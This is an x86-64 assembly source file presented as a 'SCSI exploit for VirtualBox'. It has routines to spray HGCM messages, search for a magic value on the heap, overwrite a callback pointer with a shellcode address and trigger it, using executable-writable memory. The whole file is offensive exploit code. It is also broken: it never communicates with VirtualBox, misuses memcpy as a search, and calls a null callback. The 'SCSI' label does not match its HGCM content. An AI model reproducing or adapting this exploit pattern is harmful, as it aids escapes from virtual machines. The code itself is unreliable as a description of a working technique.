; SCSI exploit for VirtualBox
bits 64
default rel

; External functions
extern VirtualAlloc
extern VirtualFree
extern GetModuleHandleA
extern GetProcAddress
extern memcpy
extern memset

; Include debug macros
%include "debug.inc"

; Constants
%define HGCM_MSG_SIZE     0x1000
%define MAX_SPRAY_COUNT   1000
%define MAGIC_VALUE       0x4141414141414141
%define PAGE_EXECUTE_READWRITE 0x40
%define MEM_COMMIT    0x1000
%define MEM_RESERVE   0x2000

; HGCM message structure
struc hgcm_msg
    .header:    resb 16    ; Message header
    .size:      resd 1     ; Message size
    .type:      resd 1     ; Message type
    .result:    resd 1     ; Result code
    .callback:  resq 1     ; Callback function pointer
    .data:      resb 4064  ; Message data (padding to 4KB)
endstruc

section .data
    ; Error messages
    str_alloc_failed: db "Failed to allocate memory", 0
    str_spray_failed: db "Failed to spray HGCM messages", 0
    str_magic_not_found: db "Magic value not found on heap", 0
    str_trigger_failed: db "Failed to trigger callback", 0
    
    ; Buffer pointers
    msg_buffer: dq 0
    heap_buffer: dq 0
    
    ; HGCM message template
    align 16
    hgcm_template:
        istruc hgcm_msg
            at hgcm_msg.header,   times 16 db 0
            at hgcm_msg.size,     dd HGCM_MSG_SIZE
            at hgcm_msg.type,     dd 1
            at hgcm_msg.result,   dd 0
            at hgcm_msg.callback, dq 0
            at hgcm_msg.data,     times 4064 db 0
        iend

section .text
global ExploitSCSI
global PrepareHGCMMsg
global SprayHGCMMsg
global FindMagicOnHeap
global OverwriteCallback
global TriggerCallback

; Function: PrepareHGCMMsg
; Prepares a single HGCM message with controlled data
PrepareHGCMMsg:
    push rbp
    mov rbp, rsp
    
    ; Allocate message buffer
    mov rcx, HGCM_MSG_SIZE
    mov rdx, MEM_COMMIT | MEM_RESERVE
    mov r8, PAGE_EXECUTE_READWRITE
    xor r9, r9
    call VirtualAlloc
    
    ; Check allocation
    test rax, rax
    jz .alloc_failed
    
    ; Save buffer pointer
    mov [msg_buffer], rax
    
    ; Copy template
    mov rcx, rax
    lea rdx, [hgcm_template]
    mov r8, hgcm_msg_size
    call memcpy
    
    xor rax, rax    ; Return success
    jmp .exit
    
.alloc_failed:
    mov rax, -1
    
.exit:
    mov rsp, rbp
    pop rbp
    ret

; Function: SprayHGCMMsg
; Sprays multiple HGCM messages to prepare for heap manipulation
SprayHGCMMsg:
    push rbp
    mov rbp, rsp
    push rbx
    
    ; Initialize counter
    xor rbx, rbx
    
.spray_loop:
    ; Check counter
    cmp rbx, MAX_SPRAY_COUNT
    jae .spray_done
    
    ; Prepare and send message
    call PrepareHGCMMsg
    test rax, rax
    jnz .spray_failed
    
    inc rbx
    jmp .spray_loop
    
.spray_done:
    xor rax, rax    ; Return success
    jmp .exit
    
.spray_failed:
    mov rax, -1
    
.exit:
    pop rbx
    mov rsp, rbp
    pop rbp
    ret

; Function: FindMagicOnHeap
; Searches for magic value on the heap
FindMagicOnHeap:
    push rbp
    mov rbp, rsp
    
    ; Allocate search buffer
    mov rcx, 0x10000    ; 64KB search buffer
    mov rdx, MEM_COMMIT | MEM_RESERVE
    mov r8, PAGE_EXECUTE_READWRITE
    xor r9, r9
    call VirtualAlloc
    
    ; Check allocation
    test rax, rax
    jz .find_failed
    
    ; Save buffer pointer
    mov [heap_buffer], rax
    
    ; Search for magic value (simplified)
    mov rcx, [heap_buffer]
    mov rdx, MAGIC_VALUE
    mov r8, 0x10000
    call memcpy    ; In reality, this would be a search function
    
    ; Return found address or 0
    mov rax, [heap_buffer]
    test rax, rax
    jz .find_failed
    
    jmp .exit
    
.find_failed:
    xor rax, rax
    
.exit:
    mov rsp, rbp
    pop rbp
    ret

; Function: OverwriteCallback
; Overwrites callback pointer with controlled value
OverwriteCallback:
    push rbp
    mov rbp, rsp
    
    ; Get message containing magic value
    call FindMagicOnHeap
    test rax, rax
    jz .overwrite_failed
    
    ; Overwrite callback (rax points to message)
    lea rcx, [rax + hgcm_msg.callback]
    mov rdx, rcx    ; Shellcode address would go here
    mov [rcx], rdx
    
    xor rax, rax    ; Return success
    jmp .exit
    
.overwrite_failed:
    mov rax, -1
    
.exit:
    mov rsp, rbp
    pop rbp
    ret

; Function: TriggerCallback
; Triggers the overwritten callback
TriggerCallback:
    push rbp
    mov rbp, rsp
    
    ; Send trigger message (simplified)
    mov rcx, [msg_buffer]
    add rcx, hgcm_msg.callback
    call qword [rcx]
    
    xor rax, rax    ; Return success
    mov rsp, rbp
    pop rbp
    ret

; Function: ExploitSCSI
; Main exploit function
ExploitSCSI:
    push rbp
    mov rbp, rsp
    
    ; Initialize exploit
    call PrepareHGCMMsg
    test rax, rax
    jnz .exit
    
    ; Spray messages
    call SprayHGCMMsg
    test rax, rax
    jnz .cleanup
    
    ; Overwrite callback
    call OverwriteCallback
    test rax, rax
    jnz .cleanup
    
    ; Trigger exploit
    call TriggerCallback
    
.cleanup:
    ; Free buffers
    mov rcx, [msg_buffer]
    xor rdx, rdx
    call VirtualFree
    
    mov rcx, [heap_buffer]
    xor rdx, rdx
    call VirtualFree
    
.exit:
    mov rsp, rbp
    pop rbp
    ret
